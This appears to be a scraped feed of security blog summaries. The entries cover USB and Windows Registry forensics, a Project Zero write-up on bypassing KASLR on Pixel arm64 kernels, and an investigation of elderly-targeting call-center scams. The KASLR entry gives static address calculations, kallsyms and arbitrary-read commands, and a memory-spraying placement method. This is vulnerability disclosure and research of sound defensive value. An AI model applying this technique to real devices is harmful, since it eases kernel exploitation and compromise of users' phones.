      "summary": "In 2005, Cory Altheide and I published the first peer-reviewed paper to address tracking USB devices on Windows systems. Over the years, it's been pretty amazing to see not only the artifacts expand and evolve, but to also see folks pick up the baton and carry on with describing what amounts to a \"playbook\" for developing this information as part of an investigation. Not only did malware such as Raspberry Robin propagate via USB devices, but with the rise of other devices that could be attached via a USB connection, but use different protocols, it became more important to operationalize this analysis in a playbook. After all, why not take the inefficient, error-prone, purely manual aspects out of the parsing by automating it? Morad R. put together a series of posts that outline different data/artifact sources you can examine to identify USB devices that had been connected to the endpoint, as well as attribute the use of the devices to a particular user. This series of posts illustrates some steps that begin the process of pulling back the veil, if you will, to unraveling the use of USB devices on Windows systems. While there is definitely more to be done and shared, the important common factor across the posts is the use of timelines. USB Forensics, pt 1: Unmasking the connected device - Focuses on the System Registry hive, and extracting time stamps from Properties key values. The focus on a timeline is great way to get started on this, as doing so takes the analyst directly to context. However, by focusing on just USB and USBStor keys in the System hive, other devices (smartphones, digital cameras) are missed. However, that's not really an issue, per se, as the same playbook can be applied to the appropriate Registry keys. USB Forensics, pt 2: Mapping device to user & drive letter - focuses on the user's NTUSER.DAT, but doesn't mention other artifacts, such as shellbags, RecentDocs, UserAssist, etc., that could be used to correlate additional user activity with the device, particularly via a timeline. RegRipper still makes use of \" profiles \", which is the term I used to describe what became known as \"playbooks\". Or, another way to look at it is that you can implement playbooks through these profiles. USB Forensics, pt 3: The Event Log timeline - focus on a timeline continues, which is good. However, the logs are technically referred to as \"Windows Event Logs\"; \"Event Logs\" refer to the Windows 2000, XP, and 2003 era logs. I understand, I 'get it', that this is a distinction without a difference for most analysts, particularly those who've never had to work with Event Log records from older systems, and are only familiar with the new format implemented as of Windows Vista. All three of these posts, together, serve as a good foundation, and a great first step toward addressing USB-connected devices on Windows endpoints. Just as the field has grown and expanded since 2005, it will continue to do so in the future. In addition to providing the data sources, the underlying reliance on (or at least pointing in the direction of) timelines is, I believe, foundational. Start with a timeline, do not let a timeline be something you assemble manually, after everything else is done. We can always add or remove data sources, create new RegRipper or Events Ripper plugins, etc., but creating a timeline should be \"first principles\". In my current role, I don't have a need to determine things such as USB devices connected to a Windows system, but if I did, I'd definitely have Events Ripper plugins to extract that information, maybe even correlate it, into an easy-to-view manner.

      "title": "Defeating KASLR by Doing Nothing at All",
      "summary": "Posted by Seth Jenkins, Project Zero Introduction I've recently been researching Pixel kernel exploitation and as part of this research I found myself with an excellent arbitrary write primitive\u2026but without a KASLR leak. As necessity is the mother of all invention, on a hunch, I started researching the Linux kernel linear mapping. The Linux Linear Mapping The linear mapping is a region in the kernel virtual address space that is a direct 1:1 unstructured representation of physical memory. Working with Jann, I learned how the kernel decided where to place this region in the virtual address space. To make it possible to analyze kernel internals on a rooted phone, Jann wrote a tool to call tracing BPF's privileged BPF_FUNC_probe_read_kernel helper, which by design permits arbitrary kernel reads. The code for this is available here . The linear mapping virtual address for a given physical address is calculated by the following macro: #define phys_to_virt(x) ((unsigned long)((x) - PHYS_OFFSET) | PAGE_OFFSET) On Arm64 PAGE_OFFSET is simply: #define VA_BITS (CONFIG_ARM64_VA_BITS) #define _PAGE_OFFSET(va) (-(UL(1) (va))) #define PAGE_OFFSET (_PAGE_OFFSET(VA_BITS)) As CONFIG_ARM64_VA_BITS is 39 on Android, it\u2019s easy to calculate PAGE_OFFSET = 0xffffff8000000000 . PHYS_OFFSET is calculated by: extern s64 memstart_addr; /* PHYS_OFFSET - the physical address of the start of memory. */ #define PHYS_OFFSET ({ VM_BUG_ON(memstart_addr & 1); memstart_addr; }) memstart_addr is an exported variable that can be looked up in /proc/kallsyms . Using Jann\u2019s bpf_arb_read program, it\u2019s easy to see what this value is: tokay:/ # grep memstart /proc/kallsyms ffffffee6d3b2b20 D memstart_addr ffffffee6d3f2f80 r __ksymtab_memstart_addr ffffffee6dd86cc8 D memstart_offset_seed tokay:/ # cd /data/local/tmp tokay:/data/local/tmp # ./bpf_arb_read ffffffee6d3b2b20 8 ffffffee6d3b2b20 00 00 00 80 00 00 00 00 |........| tokay:/data/local/tmp # This value ( 0x80000000 ) doesn\u2019t look particularly random. In fact, memstart_addr was theoretically randomized on every boot, but in practice this hasn\u2019t happened for a while on arm64. In fact as of commit 1db780bafa4c it\u2019s no longer even theoretical - virtual address randomization of the linear map is no longer a supported feature in arm64 Linux kernel. The systemic issue is that memory can (theoretically) be hot plugged in Linux and on Android because of CONFIG_MEMORY_HOTPLUG=y . This feature is enabled on Android due to its usage in VM memory sharing. When new memory is plugged into an already running system, it must be possible for the Linux kernel to address this new memory, including adding it onto the linear map. Android on arm64 uses a page size of 4 KiB and 3-level paging, which means virtual addresses in the kernel are limited to 39 bits, unlike typical X86-64 desktops which use 4-level paging and have 48 bits of virtual address space (for kernel and userspace combined); the linear map has to fit within this space further shrinking the area available for it. Given that the maximum amount of theoretical physical memory is far larger than the entire possible linear map region range, the kernel places the linear map at the lowest possible virtual address so it can theoretically be prepared to handle exorbitant (up to 256GB) quantities of hypothetical future hot-plugged physical memory. While it is not technically necessary to choose between memory hot-plugging support and linear map randomization, the Linux kernel developers decided not to invest the engineering effort to implement memory hot-plugging in a way that preserves linear map randomization. So we now know that PHYS_OFFSET will always be 0x80000000 , and thusly, the phys_to_virt calculation becomes purely static - given any physical address, you can calculate the corresponding linear map virtual address by the following formula: #define phys_to_virt(x) ((unsigned long)((x) - 0x80000000) | 0xffffff8000000000) Kernel physical address non-randomization Compounding this issue, it also happens that on Pixel phones, the bootloader decompresses the kernel itself at the same physical address every boot: 0x80010000 . tokay:/ # grep Kernel /proc/iomem 80010000-81baffff : Kernel code 81fc0000-8225ffff : Kernel data Theoretically, the bootloader can place the kernel at a random physical address every boot, and many (but not all) other phones, such as the Samsung S25, do this. Unfortunately, Pixel phones are an example of a device that simply decompresses the kernel at a static physical address. Calculating static kernel virtual addresses This means that we can statically calculate a kernel virtual address for any kernel .data entry. Here\u2019s an example of me computing that linear map address for the modprobe_path string in kernel .data on a Pixel 9: tokay:/ # grep modprobe_path /proc/kallsyms ffffffee6ddf2398 D modprobe_path tokay:/ # grep stext /proc/kallsyms ffffffee6be10000 T _stext //Offset from kernel base will be 0xffffffee6ddf2398 - 0xffffffee6be10000 = 0x1fe2398 //Physical address will be 0x80010000 + 0x1fe2398 = 0x81ff2398 //phys_to_virt( 0x81ff2398 ) = 0xffffff8001ff2398 tokay:/ # /data/local/tmp/bpf_arb_read ffffff8001ff2398 64 ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 |.system/bin/modp| ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 |robe............| [ zeroes ] tokay:/ # reboot sethjenkins@sethjenkins91:~$ adb shell tokay:/ $ su tokay:/ # /data/local/tmp/bpf_arb_read ffffff8001ff2398 64 ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 |.system/bin/modp| ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 |robe............| [ zeroes ] tokay:/ # So modprobe_path will always be accessible at the kernel virtual address 0xffffff8001ff2398 , in addition to its normal mapping, even with KASLR enabled. In practice, on Pixel devices you can derive a valid virtual address for a kernel symbol by calculating its offset and simply adding a hardcoded static kernel base address of 0xffffff8000010000 . In short, instead of breaking the KASLR slide, it is possible to just use 0xffffff8000010000 as a kernel base instead. The linear mapping memory is even mapped rw for any kernel .data regions. The only consolation that makes using this address slightly less effective than the traditional method of leaking the KASLR slide is that .text regions are not mapped executable - so an attacker cannot use this base for e.g. ROP gadgets or more generally PC control. But oftentimes, a Linux kernel attacker\u2019s goal isn\u2019t arbitrary code execution in kernel context anyway - arbitrary read-write is the more frequently desired primitive. Impact on devices with kernel physical address randomization Even on devices where the kernel location is randomized in the physical address space, linear mapping non-randomization still softens the kernel considerably to attempts at exploitation. This is particularly because techniques that involve spraying memory (either kernel structures or even userland mmap\u2019s!) can land at predictable physical addresses - and those physical addresses are easily referenceable in kernel virtual address space through the linear map. That potentially gives an attacker a methodology for placing kernel data structures or even simply attacker-controlled userland memory at a known kernel virtual address. I created a simple program that allocated (via mmap and page fault) a substantial quantity (~5 GB) of physical memory on a Samsung S23, then used /proc/pagemap to create a list of which physical page frame numbers (pfns) were allocated. I ran this program 100 times (rebooting in between each time), then counted how often each pfn appeared across the 100 execution cycles. The set of pfns and their counts for how often they appeared were then converted into an image where each pfn is represented by a single pixel. The brighter the green of a pixel, the more often that page was attacker controlled, with a white pixel representing a pfn that was allocated every time. A black pixel represents a pfn that was never allocated - often because those pfn numbers are not mapped to physical memory or because they are used every time in a deterministic way. A big thank you to Jann Horn for developing the tool to create this image from the data that I collected. This data exemplifies the non-homogenous reliability of pfn allocation to userland mappings, albeit on a device that was only just rebooted. There are ranges of pfns that are allocated quite reliably, and other ranges that are quite unreliable (but still occasionally used). For example, here\u2019s a range of pfns surrounding one of the pages that was allocated 100 times in a row. I suspect this sample is representative of the practical reliability of this technique for placing desired data at a known kernel address for at least a newly rebooted device. While reliability may suffer on a device that hasn\u2019t rebooted in some time, it remains high enough to be inviting to real-world attackers. Being able to place arbitrarily readable and writable data at a known kernel virtual address is a powerful exploitation primitive as an attacker can much more easily forge kernel data structures or objects and, for example, emplace pointers to those objects in heap sprays attacking UAF issues. The Prognosis I reported these two separate issues, lack of linear map randomization , and kernel lands at static physical address in Pixel , to the Linux kernel team and Google Pixel respectively. However both of these issues are considered intended behavior. While Pixel may introduce randomized physical kernel load addresses at some later point as a feature, there are no immediate plans to resolve the lack of randomization of the Linux kernel\u2019s linear map on arm64. Conclusion Three years ago, I wrote on the state of x86 KASLR and noted how \u201cit is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.\u201d While it remains true that KASLR should not be trusted to prevent exploitation, particularly in local contexts, it is regrettable that the attitude around Linux KASLR is so fatalistic that putting in the engineering effort to preserve its remaining integrity is not considered to be worthwhile. The joint effect of these two issues dramatically simplified what might otherwise have been a more complicated and likely less reliable exploit. While side-channel attacks do impact the long-term viability of KASLR on all architectures, it is notable that Project Zero and the Google Threat Intelligence Group have yet to see a hardware side-channel attack for bypassing KASLR on Android in the wild. Additionally, KASLR still plays an important role in mitigating any remote kernel exploitation attempts. It is valuable from a security in-depth perspective to recognize the impact KASLR has on exploit complexity and reliability in real-world scenarios. In the future, we hope to see changes to the Linux kernel linear mapping and memory hot-plugging implementation to make this a less inviting target for attackers. Randomizing the location of the linear map in the virtual address space, increasing the entropy in physical page allocation , and randomizing the location of the kernel in the physical address space are all concrete steps that can be taken that would improve the overall security posture of Android, the Linux kernel, and Pixel.",

      "title": "Registry Analysis",
      "summary": "First off, what is \"analysis\"? I submit that \"analysis\" is what happens when an examiner has investigative goals and context, and applies this, along with their knowledge and experience, to a data set. This can be anything, from a physical image of a mobile device, to a triage collection from an endpoint, to logs from a device, or various devices. IMHO, this distinction is valuable, because what we often call \"analysis\" is really nothing more than parsing. For example, someone may recommend (or state as part of their process) that we open a Registry hive in a viewer, and navigate to a particular path by clicking through the UI. Now, there are ways that this could be accomplished in a much more efficient manner (I didn't say \"easier\", because the command line isn't \"easier\" for some), but in the end, looking for one value, dumping all of the values from a user's Run key is still just parsing; there's no \"analysis\" unless the investigator can articulate how this action and their finding applies to their goals. Registry Analysis That being said, again...what we most often think of, or refer to as \"Registry analysis\" really amounts to nothing more than simple parsing. Few are actually conducting analysis of the files that comprise the Windows Registry, largely because the knowledge of and experience with these files is often somewhat limited. For example...and you don't need to raise your hands...but how many analysts are incorporating Registry hive file metadata into timelines? Or incorporating deleted keys and values in their overall analysis plan? The Windows Registry includes a great deal of information related to the configuration of the endpoint, and for each user, contains information related to that user's activities. Not only does the Registry contain considerable metadata, but some of the values found within the Registry can contain valuable information regarding pre-existing states/conditions of the endpoint. For example, what we refer to as \"shellbag\" artifacts are comprised of shell items, strung together in shell item ID lists. Some of these shell items themselves contain considerable metadata, such as time stamps from folders, preserved at the time the \"shellbag\" artifacts were created. Something else to consider is that very often, information stored in the Registry will persist beyond the point where applications and files are deleted/removed from the endpoint. Over the years, the Windows Registry has gone through changes, but the analysis process remains the same, in part, because the binary format of the Registry remains consistent. What we traditionally refer to as \"Registry analysis\" now extends beyond \"the usual\" hive files that make up the Windows Registry, to the AmCache.hve file, as well as similarly formatted files associated with AppX packages. Ogmini's recent blog post regarding Registry hives associated with AppX packages references/points to Mari's ZeroFox blog on the topic, as well as Chris's Cyber Triage contribution , in addition to discussing sources beyond the \"traditional\" Registry. As these files are of the same format, there's no reason to believe that what we learned about the traditional hive files...metadata, what constitutes a \"deleted\" key or value, etc...needs to change when it comes to these files, as well. We can parse them for keys and values, such as looking for the recently accessed documents in the AppX version of Notepad or WordPad, just as we can parse these files into a timeline. Parting Thoughts Limitations or shortcomings in knowledge and experience of individual analysts can (and does) lead to the analysis and intel \"poverty\", and the shortcomings have a cascading impact. To overcome these, we need to work together, in mentor/mentee relationships, to build better, more applicable processes that allow us to fill these gaps. Operationalizing \"corporate\" knowledge for the long term is the key to this, as knowledge is shared without the requirement for commensurate experience.",

      "summary": "Today my LinkedIn feed and Google News filter is showing me several stories that illustrate how we are failing to stop online scammers from stealing from our elderly. It starts with the headlines. CTVNews : Ontario seniors GIVE AWAY MORE THAN $1 MILLION to scammers. CTVNews: Ontario couple LOSES MORE THAN $1 MILLION DOLLARS to fraud. Toronto Only : A couple ... LOST MORE THAN $1 MILLION Daily Mail : Elderly couple transfer $1m to online scammers despite warning from bank The tone of several of these stories, is victim shaming and leads with the wrong headline. They didn't \"Give away\" or \"Lose\" or \"Transfer\" these funds. They were STOLEN FROM THEM. Illicit Call Centers: \"Facebook Pop-Ups\" One of the ways that we learn about how these scams play out is that we engage with scammers. I'm not a professional scam baiter or anything close to it, but it is a useful research tool. When I read the story of the Ontario couple, I knew exactly the type of script that was being followed, because I experienced it last month. Usually when I call an illicit call center on purpose, I am asked very quickly to give remote control of my computer to the scammers. But one day last month, the call followed a very different script than the primary ones to which I am accustomed. It started with a Facebook advertisement. In the top right corner of my Facebook homepage, I had two advertisements displayed: The goal of these advertisements is to make a less than wary Facebook user believe that they have unread messages that need to be attended to. I actually wrote a longer piece for LinkedIn about this type of advertisement about six months ago. See: \" Dangerous Facebook Ads and Call Center Scams \" on my LinkedIn page. In this case, the \"vendor\" who is providing the Facebook Ads portion of this scam is almost certainly operating from Vietnam. Crime is global. Who knew? Clicking the ad, in the incident that I experience on October 17, 2025, led to exactly the same next steps as the ones I reported on April 24, 2025. A fake \"Facebook Suspended\" page (hosted on web.core.windows[.]net) Whether you choose \"Accept\" or \"Ignore\" on this page, the next thing that happens is that your browser goes \"Full Screen\" and begins to play an audio warning on loop while displaying this Warning Page: Mouse clicking is disabled while an audio warning tells us our Facebook account is going to be deleted if we don't call the indicated number immediately. I know that I can \"Alt-F4\" out of this message, but many users would not know how to do so. According to our friends at URLScan.io, they have received reports of the \"Facebook Suspended\" intermediate page in the scam delivery using 933 different URLs, most recently, today. After a huge spike from November 2024 to January 2025, there has been a constant trickle of these nearly every day since ... often using Microsoft Azure nodes. URLScan.io statistics on this page. Checking the Meta Ad Library, it is easy to see that a new round of these ads launched on October 29, 2025 (two days ago): The new ads redirect through a slightly different intermediary page (I have an incoming call from a pretty girl) and then tell me that \"Microsoft Care has temporarily disabled your Internet connection\" and that I need to call or my \"Facebook and Internet accounts will be permanently disabled.\" new intermediary page new BSOD page as of 31OCT2025 Illicit Call Centers: Qualifying and \"Recruiting\" When I placed my call to the scammers on October 17th, I have to admit to being a bit inspired by \" Scammer Payback \" as I had recently written about his work in breaking up a $65 Million Crime Ring . I wrote about it in my post \" Indian Call Center Scammers Partner with Chinese Money Launderers \" on this blog. Following Pierogi's lead, I answered the scammers questions as if I were a retiree. (Don't let the grey beard fool you, I'm not!) The first thing the scammers had me do was to power off my computer. (I was playing an MP3 of their scam audio so they believed I was still on their \"lock screen.\") They asked me \"Is this your own computer? or a work computer?\" I answered \"Work computer? Heavens no! I haven't worked in years!\" Then they asked me \"Do you know what an IP address is?\" I answered \"No, I've never heard of an IT address, but my grandson works in IT ... is this related to him?\" They gave me a very poor explanation of what an IP address is and then asked who my Internet carrier was. I lied and told them a carrier that doesn't even offer services in my area. They \"put me on a brief hold\" during which I could hear people talking in Hindi to one another. Then they came back and said \"Yes, I see that your IP address is under investigation by (imaginary carrier)!\" Then they asked me where I banked (I lied again) and whether I had an investment account (I lied again.) After putting me on another hold, they came back and said that my bank account was also under investigation. After a few minutes, they came back and said (in a very grave voice) that unfortunately, I was under suspicion for distributing \"child pornography\" (an obsolete and inappropriate term for Child Sexual Abuse Materials). Unfortunately, they had no choice but to turn this matter over to the FBI. Please hold as they were going to transfer me to the FBI Agent then. As I denied having any involvement in CSAM materials, the FBI Agent very sternly yelled at me and asked me for my ZIP Code. Unfortunately I had a meeting to attend about then, so I disengaged, but I know the rest of that script. The ZIP Code is so that they can look up the address of the nearest Bitcoin ATM from my house. This is the BEGINNING of what happened to \"the Ontario Couple\" (only of course they were speaking to a Royal Canadian Mounted Police Agent, rather than an FBI Agent.) We have assisted in several of these cases -- twice involving the elderly relatives of my own students -- who were convinced over the course of many phone calls over many days -- that they needed to withdraw their cash from the bank, and in one case, put the cash in an overnight delivery box and ship it to a CVS store in the Chicago area. Why would they do that? Because the FBI, convinced of their innocence, had asked their permission to use their bank account for a \"sting\" against a Mexican Drug Cartel. The \"FBI Agent\" in one case made them take an imaginary oath, similar to the oath one would take when being sworn into military service, that as part of the FBI's Undercover Operation, they were not allowed to speak to anyone about their secret mission. Doing so would result in them being arrested and charged with Obstruction of Justice. So when the bank says \"Why are you withdrawing this money?\" and they reply \"Because I've decided to invest in Gold Bars\" they are not \"ignoring the warning of the bank\" they are \"following their orders as a sworn undercover agent assisting the FBI in breaking up a drug cartel!\" In the Ontario couple's case, the psychological oppression and manipulation continued for FIVE MONTHS as they had their money slowly stolen by a TransNational Organized Crime group who has perfected the art of manipulation. And in that scenario, the Daily Mail and CTV want to broadcast that these fools gave their money away to criminals despite the bank's warning and they want YOU to believe that is what happened. Shame on them! Illicit Call Centers: Crime-As-A-Service (via Facebook) How do these types of crimes begin? To understand, it is necessary to start taking apart the illicit call center Crime-as-a-Service model that operates via Facebook Groups. We've been talking about these for nearly a decade now and they are more active now than ever before. Here's an example of a scammer boasting that he offers calls on a \"Pay Per Call\" model for a variety of fraud types. Facebook, Blue Screen of Death, Amazon, and PayPal. His point in sharing the Call Duration is to indicate that his calls are \"sticky.\" That is, they are likely to have a long enough conversation to \"sink the hook.\" Calls from 1308 seconds (21 minutes) to 4765 seconds (79 minutes!) are likely to have been believable enough that there is time to have taken the scam to a financially rewarding level. \"Sounds\" posted their advertisements in groups such as: all about tech support Genuine Techsupport calls and blocking Tech support calls PPC Expert for Tech Support PPC Services for Tech Support Tech Support Genuine Calls Kolkata/Delhi Tech Support Calls Delhi/Noida/Chandigarh Every piece of the criminal infrastructure needed to run these scams is available in this Crime-as-a-Service Facebook groups. Whatever your Illicit Call Center needs, they can provide it. Toll Free Numbers? Fake invoices sent via PayPal? Cash Pickup services in USA and Canada? Zelle accounts to use for money laundering? And of course as we have already mentioned, the Chinese Money Laundering Organizations are now offering their services inside the Indian Call Center CaaS Facebook groups as well ... (+852 = Hong Kong) \"Kevin\" is in the Facebook groups that are more dedicated to the money laundering side of these transnational organized crime operations. Groups like: Venmo,varo,paypal,zelle,cash PayPal, Venmo And Cash App Verification - 11,400 members Paypal | Venmo | Zelle | G-Pay 24/7 Support - 2,100 members That largest group has been \"frozen by Admin\" after we reported the popular \"BuyAccounts\" service that was offering to sell stolen bank accounts and advertiser accounts: \"Norman Mike\" was advertising an Indian telephone number despite attending the University of Johannesburg, living in London, and having an American flag as their cover image. https://www.facebook.com/norman.mike.7528/ I'll be sure to post an update on what happens when we suggest to Facebook that Norman Mike may be a fake account! Illicit Call Centers: STOP BLAMING THE VICTIM! In this Crime-as-a-Service Infrastructure, criminals like the Vietnamese programmers who place the Facebook ads work with Indian \"Lead Generators\" who promise to send \"Facebook Pay Per Call\" telephone calls from potential victims to Illicit call centers in India and Pakistan, who use Pakistani-provided Toll Free Numbers to make connection, and then use Chinese Money Laundering Organizations to pick up their cash, could we agree that perhaps things are a bit more complicated than our average Ontario pensioner is able to tackle by themselves? When the Illicit Call Center's scripts and practices qualify the victim as an elderly high wealth pensioner and they are \"recruited by the FBI or RCMP\" it is entirely insufficient for the bank to say \"Sir, this may be a scam\" and then boast to the media how they provided an adequate warning!",
